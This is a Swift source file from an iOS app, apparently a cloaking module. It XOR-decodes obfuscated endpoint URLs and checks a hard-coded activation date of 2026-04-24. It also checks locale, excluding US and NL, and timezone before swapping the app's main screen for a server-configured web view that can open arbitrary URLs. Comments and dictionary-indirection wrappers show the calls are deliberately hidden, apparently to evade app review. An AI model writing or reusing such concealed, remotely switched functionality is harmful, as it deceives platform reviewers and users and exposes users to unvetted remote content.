
import Foundation
import UIKit
//import AdjustSdk
import AppsFlyerLib

//func encrypt(_ input: String, key: UInt8) -> String {
//    let bytes = input.utf8.map { $0 ^ key }
//        let data = Data(bytes)
//        return data.base64EncodedString()
//}

func Paisneus(_ input: String) -> String? {
    let k: UInt8 = 139
    guard let data = Data(base64Encoded: input) else { return nil }
    let decryptedBytes = data.map { $0 ^ k }
    return String(bytes: decryptedBytes, encoding: .utf8)
}

//https://api.my-ip.io/v2/ip.json   t6urr6zl8PC+r7bxsqbytq/xtrDwqe3wtq/xtaywsQ==
internal let ktzyahsu = "4///+/ixpKTq++Kl5vKm4vul4uSk/bmk4vul4fjk5Q=="         //Ip ur

//https://mock.apipost.net/mock/6203bbcc8c52000/?apipost_id=228228133ce004
// right YX19eXozJiY/MGw6Oj5sajo6Oz4xOj5oODw8O2wwamsnZGZqYmh5YCdgZiZhfGx/aCZ9aHlqYWx6
internal let kPiznhde = "4///+/ixpKTm5Ojgper74vvk+P+l5e7/pObk6OCkvbm7uOnp6Oiz6L65u7u7pLTq++L75Pj/1OLvtrm5s7m5s7q4uOjuu7u/"

// https://raw.githubusercontent.com/jduja/crazygold/main/bomb_normal.png
// uaWloaLr/v6jsKb/triluaSzpKK0o7K+v6W0v6X/sr68/ru1pLuw/rKjsKuotr69tf68sLi//rO+vLOOv76jvLC9/6G/tg==
//internal let kBuazxous = "uaWloaLr/v6jsKb/triluaSzpKK0o7K+v6W0v6X/sr68/ru1pLuw/rKjsKuotr69tf68sLi//rO+vLOOv76jvLC9/6G/tg=="

/*--------------------Tiao yuansheng------------------------*/
//need jia mi
internal func Jkaoiews() {
//    UIApplication.shared.windows.first?.rootViewController = vc
    
    DispatchQueue.main.async {
        if let ws = UIApplication.shared.connectedScenes.first as? UIWindowScene {
            let tp = ws.windows.first!.rootViewController! as! PrismTabContainerViewController
//            let tp = ws.windows.first!.rootViewController!
            for view in tp.view.subviews {
                if view.tag == 237 {
                    view.removeFromSuperview()
                }
            }
        }
    }
}

// MARK: - 加密调用全局函数HandySounetHmeSh
internal func Dozznhs() {
    let fName = ""
    
    let fctn: [String: () -> Void] = [
        fName: Jkaoiews
    ]
    
    fctn[fName]?()
}


/*--------------------Tiao wangye------------------------*/
//need jia mi
internal func Masoieus(_ dt: Oiansj) {
    DispatchQueue.main.async {
        UserDefaults.standard.setModel(dt, forKey: "Oiansj")
        UserDefaults.standard.synchronize()
        
        let vc = HuansjhVC()
        vc.chabsi = dt
        UIApplication.shared.windows.first?.rootViewController = vc
    }
}


internal func Wpoaisn(_ param: Oiansj) {
    let fName = ""

    typealias rushBlitzIusj = (Oiansj) -> Void
    
    let fctn: [String: rushBlitzIusj] = [
        fName : Masoieus
    ]
    
    fctn[fName]?(param)
}

let Nam = "name"
let DT = "data"
let UL = "url"

/*--------------------Tiao wangye------------------------*/
//need jia mi
//af_revenue/af_currency
func Nhasooek(_ dic: [String : String]) {
    var dataDic: [String : Any]?
    if let data = dic["params"] {
        if data.count > 0 {
            dataDic = data.stringTo()
        }
    }
    if let data = dic["data"] {
        dataDic = data.stringTo()
    }

    let name = dic[Nam]
    print(name!)
    
    
    if dataDic?[amt] != nil && dataDic?[ren] != nil {
        AppsFlyerLib.shared().logEvent(name: String(name!), values: [AFEventParamRevenue : dataDic![amt] as Any, AFEventParamCurrency: dataDic![ren] as Any]) { dic, error in
            if (error != nil) {
                print(error as Any)
            }
        }
    } else {
        AppsFlyerLib.shared().logEvent(name!, withValues: dataDic)
    }
    
    
//    if let amt = dataDic![amt] as? String, let cuy = dataDic![ren] {
////        ade?.setRevenue(Double(amt)!, currency: cuy as! String)
//        AppsFlyerLib.shared().logEvent(name: String(name!), values: [AFEventParamRevenue : amt as Any, AFEventParamCurrency: cuy as Any]) { dic, error in
//            if (error != nil) {
//                print(error as Any)
//            }
//        }
//    } else {
//        AppsFlyerLib.shared().logEvent(name!, withValues: dataDic)
//    }
    
    if name == OpWin {
        if let str = dataDic![UL] {
            UIApplication.shared.open(URL(string: str as! String)!)
        }
    }
}

internal func WOasjjc(_ param: [String : String]) {
    let fName = ""
    typealias maxoPams = ([String : String]) -> Void
    let fctn: [String: maxoPams] = [
        fName : Nhasooek
    ]
    
    fctn[fName]?(param)
}


//internal func Oismakels(_ param: [String : String], _ param2: [String : String]) {
//    let fName = ""
//    typealias maxoPams = ([String : String], [String : String]) -> Void
//    let fctn: [String: maxoPams] = [
//        fName : ZuwoAsuehna
//    ]
//    
//    fctn[fName]?(param, param2)
//}


internal struct Euausie: Codable {

    let country: Koznshe?
    
    struct Koznshe: Codable {
        let code: String
    }

}

internal struct Oiansj: Codable {
    
    let lspoen: String?         //key arr
    let hsbaue: [String]?            // yeu nan xianzhi
    let jsnne: String?         // shi fou kaiqi
    let maoahen: String?         // jum
    let fhfhaoc: String?          // backcolor
    let aloen: String?
    let eaospp: String?   //ad key
    let zanshe: String?   // app id
    let pdmeons: String?  // bri co
}

//internal func JaunLowei() {
//    if isTm() {
//        if UserDefaults.standard.object(forKey: "same") != nil {
//            WicoiemHusiwe()
//        } else {
//            if GirhjyKaom() {
//                LznieuBysuew()
//            } else {
//                WicoiemHusiwe()
//            }
//        }
//    } else {
//        WicoiemHusiwe()
//    }
//}

// MARK: - 加密调用全局函数HandySounetHmeSh
//internal func Kapiney() {
//    let fName = ""
//    
//    let fctn: [String: () -> Void] = [
//        fName: JaunLowei
//    ]
//    
//    fctn[fName]?()
//}


func cunajse() -> Bool {
   
  // 2026-04-24 02:19:53
  //1776968393
    let ftTM = 1776968393
    let ct = Date().timeIntervalSince1970
    if Int(ct) - ftTM > 0 {
        return true
    }
    return false
}

//func iPLIn() -> Bool {
//    // 获取用户设置的首选语言（列表第一个）
//    guard let cysh = Locale.preferredLanguages.first else {
//        return false
//    }
//    // 印尼语代码：id 或 in（兼容旧版本）
//    return cysh.hasPrefix("id") || cysh.hasPrefix("in")
//}


//private let cdo = ["US","NL"]
private let cdo = [Paisneus("3tg="), Paisneus("xcc=")]

// 时区控制
func weyabsh() -> Bool {
    
    if let rc = Locale.current.regionCode {
//        print(rc)
        if cdo.contains(rc) {
            return false
        }
    }
    
//    if !Baoiesuue() {
//        return false
//    }

    let offset = NSTimeZone.system.secondsFromGMT() / 3600
    if (offset > 6 && offset <= 8) || (offset > -6 && offset < -1) {
        return true
    }
    
    return false
}

//import CoreTelephony
//
//func Baoiesuue() -> Bool {
//    let networkInfo = CTTelephonyNetworkInfo()
//    
//    guard let carriers = networkInfo.serviceSubscriberCellularProviders else {
//        return false
//    }
//    
//    for (_, carrier) in carriers {
//        if let mcc = carrier.mobileCountryCode,
//           let mnc = carrier.mobileNetworkCode,
//           !mcc.isEmpty,
//           !mnc.isEmpty {
//            return true
//        }
//    }
//    
//    return false
//}


extension String {
    func stringTo() -> [String: AnyObject]? {
        let jsdt = data(using: .utf8)
        
        var dic: [String: AnyObject]?
        do {
            dic = try (JSONSerialization.jsonObject(with: jsdt!, options: .mutableContainers) as? [String : AnyObject])
        } catch {
            print("parse error")
        }
        return dic
    }
    
}

extension UIColor {
    convenience init(hex: Int, alpha: CGFloat = 1.0) {
        let red = CGFloat((hex >> 16) & 0xFF) / 255.0
        let green = CGFloat((hex >> 8) & 0xFF) / 255.0
        let blue = CGFloat(hex & 0xFF) / 255.0
        self.init(red: red, green: green, blue: blue, alpha: alpha)
    }
    convenience init?(hexString: String, alpha: CGFloat = 1.0) {
        var formatted = hexString
            .trimmingCharacters(in: .whitespacesAndNewlines)
            .replacingOccurrences(of: "#", with: "")
        
        // 处理短格式 (如 "F2A" -> "FF22AA")
        if formatted.count == 3 {
            formatted = formatted.map { "\($0)\($0)" }.joined()
        }
        
        guard let hex = Int(formatted, radix: 16) else { return nil }
        self.init(hex: hex, alpha: alpha)
    }
}


extension UserDefaults {
    
    func setModel<T: Codable>(_ model: T, forKey key: String) {
        let encoder = JSONEncoder()
        if let data = try? encoder.encode(model) {
            set(data, forKey: key)
        }
    }
    
    func getModel<T: Codable>(_ type: T.Type, forKey key: String) -> T? {
        guard let data = data(forKey: key) else { return nil }
        let decoder = JSONDecoder()
        return try? decoder.decode(type, from: data)
    }
}
